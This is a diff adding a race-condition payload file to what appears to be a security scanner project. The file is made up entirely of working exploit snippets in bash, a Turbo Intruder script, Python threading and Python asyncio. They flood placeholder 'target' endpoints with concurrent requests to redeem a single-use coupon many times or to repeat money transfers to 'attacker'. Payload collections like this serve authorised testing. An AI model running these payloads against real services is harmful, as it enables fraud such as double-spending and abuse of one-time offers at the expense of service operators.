@@ -1,0 +1,31 @@
+# Race Condition Payloads — cyberm4fia-scanner
+# Categories: Parallel Requests, Turbo Intruder, Last-Byte Sync
+
+# ─── Bash parallel requests ───
+seq 1 20 | xargs -P 20 -I {} curl -s "https://target/api/apply-coupon" -H "Authorization: Bearer TOKEN" -d '{"code":"DISCOUNT50"}'
+
+# ─── Parallel transfer exploit ───
+for i in $(seq 1 50); do
+  curl -s "https://target/api/transfer" -H "Authorization: Bearer TOKEN" -d '{"amount":100,"to":"attacker"}' &
+done; wait
+
+# ─── Turbo Intruder last-byte sync ───
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
+    for i in range(20):
+        engine.queue(target.req, gate='race')
+    engine.openGate('race')
+
+# ─── Python threading ───
+import requests, threading
+def send():
+    requests.post('https://target/api/redeem', json={'coupon':'ONCE123'}, headers={'Authorization': 'Bearer token'})
+[threading.Thread(target=send).start() for _ in range(20)]
+
+# ─── Python asyncio ───
+import aiohttp, asyncio
+async def race():
+    async with aiohttp.ClientSession() as s:
+        tasks = [s.post('https://target/api/action', json={'p':'v'}) for _ in range(50)]
+        await asyncio.gather(*tasks)
+asyncio.run(race())
